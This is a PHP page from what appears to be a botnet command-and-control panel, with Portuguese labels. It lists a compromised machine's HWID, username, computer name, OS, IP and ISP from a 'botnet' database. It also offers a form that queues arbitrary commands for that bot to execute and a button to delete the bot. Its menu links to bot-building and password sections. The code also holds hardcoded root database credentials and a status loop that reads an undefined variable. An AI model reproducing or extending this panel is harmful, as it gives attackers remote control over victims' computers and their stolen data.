<?php
    require_once 'classes/Usuario.php';
    session_start();
    if(!isset($_SESSION['id'])){
        header("Location: login.php");
        exit;
    }
    if(!isset($_GET['hwid'])){
        header("Location: index.php");

    }
    
?>


<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/css/edit.css">
    <link rel="shortcut icon" href="/assets/img/favicon.png" type="image/x-icon">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500&display=swap" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css" integrity="sha384-vSIIfh2YWi9wW0r9iZe7RJPrKwp6bG+s9QZMoITbCckVJqGCCRhc+ccxNcdpHuYu" crossorigin="anonymous">
    
    <title>Root VSPRIV</title>

</head>

<body class="container">
    <header class="classe100">
        <div id="logo">
            <a href="index.php">
                <img class="logo-one" src="assets/img/Sem título.png" width="220px">
            </a>
        </div>

        <nav class="menu">
            <form method="POST">
                <button type="submit" class="open-button x" name="botao"><i class="fas fa-bars"></i></button>
            </form>
 
            <?php 
                if(isset($_POST['botao'])){
                    echo  "<nav class='menu open'>";
                }
                if(isset($_POST['botao2'])){
                }
            ?>

            <div class="backgrop"></div>
            <ul>
                <form method="POST">
                    <li class="close-menu"><button type="submit" name="botao2"><i class="fas fa-times y"></i></button></li>
                </form>
                
                <li class="edit"><a href="index.php">HOME</a></li>
                <li><a href="bots.php">BOTS</a></li>
                <li><a href="#">BUILDING</a></li>
                <li><a href="#">PASSWORDS</a></li>
                <li><a href="#">CHAT</a></li>
                <li><a href="sair.php">SAIR</a></li>      

            </ul>
        </nav>
    </header>
    <div class="container-form-edit">
        <div class="form-edit-title">
            <p>BOTS</p>
        </div>
        <div class="form-edit">
            <div class="title-form-edit2">
                <p>EDITE OS DADOS</p>
                    <form class="formluser" method="POST">
                        <input class="edit_user" name="dataedit" type="submit" value="EDITAR DADOS">
                    </form>
            </div>
            <?php
                if(isset($_POST['dataedit'])){
                    echo "<script>alert('VOCE NAO TEM PERMISSAO!');</script>";
                }
            ?>
            <div class="exib-dados">
            <table class="table-scroll small-first-col">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>HWID</th>
                        <th>NOME</th>
                        <th>USER</th>
                        <th>SISTEMA</th>
                        <th>ARQUITETURA</th>
                        <th>IP</th>
                        <th>DATA</th>
                        <th>STATUS</th>
                        
                    </tr>
                </thead>
            <?php

                    $hwid = $_GET['hwid'];
                    $sql = new PDO("mysql:dbname=botnet;host=localhost","root","root");
                    $pdo = $sql->prepare("SELECT * FROM bots where hwid=:h");
                    $pdo->BindValue(":h",$hwid);
                    $pdo->execute();
                    $online = $sql->prepare("SELECT * FROM online");
                    $online->execute();
                    $provedora;
                    $ip;
                    while($data = $pdo->fetch(PDO::FETCH_ASSOC)){
                        $bool = true;
                        print "<tr>";
                        print "<td>{$data['id']}</td>";
                        print "<td>{$data['hwid']}</td>";
                        print "<td>{$data['username']}</td>";
                        print "<td>{$data['computername']}</td>";
                        print "<td>{$data['os']}</td>";
                        print "<td>{$data['osarch']}</td>";
                        print "<td>censured</td>";
                        //print "<td>{$data['eip']}</td>";
                        $ip = $data['eip'];
                        print "<td>{$data['date']}</td>";
                        $provedora = $data['isp'];
                        while($status = $online->fetch(PDO::FETCH_ASSOC)){
                            if($row['situacao'] == $row['hwid']){
                                
                                print "<td>{$status['situacao']}</td>";
                                $bool = false;
                            }
                            
                        }
                        if($bool){
                            echo "<td>OFF</td>";
                        }
                        
                        echo "</tr>";
                        
                    }
                ?>  
                
            </div>
            </table>
            <?php

                echo "<h3 class='local'>LOCALIDADE: -------</h3>";
            ?>
        </div>
        
        <div class="this-form-all">
            <div class="title-form-edit2">
                <p>COMANDOS</p>
                <form method="POST">
                        <input class="edit_user" name="execcmd" type="submit" value="EXECUTAR">

            </div>
            <div class="formulariosxt xtwk"> 

                    <input autocomplete="off" class="pxw comando" name="cmdxt" type="text" placeholder="COMANDO">
            </div>
        </div>

        <div class="delete-buttom">
            <div class="delete-buttom2">
                    <input type="submit" class="delete-buuttomv" name="deleted" value="Apagar BOT">
                </form>
            </div>
                    
        </div>
    </div>
    <?php
    
        if(isset($_GET['hwid']) && isset($_POST['cmdxt']) && isset($_POST['execcmd'])){
            $hid = $_GET['hwid'];
            $cmd = $_POST['cmdxt'];
            $sql = new PDO("mysql:dbname=botnet;host=localhost","root","root");
            $pdo = $sql->prepare("INSERT INTO comando (comando,hwid) values (:c,:h)");
            $pdo->BindValue(":c",$cmd);
            $pdo->BindValue(":h",$hid);
            $pdo->execute(); 
        }



        if(isset($_GET['hwid']) && isset($_POST['deleted'])){
            $hhid = $_GET['hwid'];
            $sql = new PDO("mysql:dbname=botnet;host=localhost","root","root");
            $pdo = $sql->prepare("DELETE FROM bots where hwid=:hw");
            $pdo->BindValue(":hw", $hhid);
            $pdo->execute();

            $online = $sql->prepare("DELETE FROM online where hwid =:hw");
            $online->BindValue(":hw", $hhid);
            $online->execute();
            header("Location: index.php");
        }
    ?>
</body>
</html>